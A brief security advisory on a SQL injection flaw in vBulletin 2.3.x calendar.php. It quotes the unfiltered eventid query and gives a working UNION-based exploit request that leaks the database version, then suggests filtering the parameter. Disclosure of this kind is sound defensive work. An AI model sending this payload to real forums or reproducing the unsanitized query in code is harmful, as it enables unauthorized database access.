vBulletin Forum 2.3.xx calendar.php SQL Injection
========================================================
Website: www.safechina.net
Discovered by: mslug (a1476854@...mail.com)

Description:
=============
There exist a sql injection problem in calendar.php. Notice the eventid 
field.

-------- Cut from line 585 in calendar.php ----------
else if ($action == "edit")
{
      $eventinfo = $DB_site->query_first("SELECT 
allowsmilies,public,userid,eventdate,event,subject FROM calendar_events 
WHERE eventid = $eventid");
-----------------------------------------------------

If the MySQL version is greater than 4.00, a UNION attack could be used.

Exploit request
================
calendar.php?s=&action=edit&eventid=14 union (SELECT 
allowsmilies,public,userid,'0000-0-0',version(),userid FROM calendar_events 
WHERE eventid = 14) order by eventdate

(14 is the eventid of your added event)

The subject and event field will show the result.

The query_first function will only return the first row of the query result, 
so make sure it returns the
one you want.

The Fix?
============
filter eventid before query.
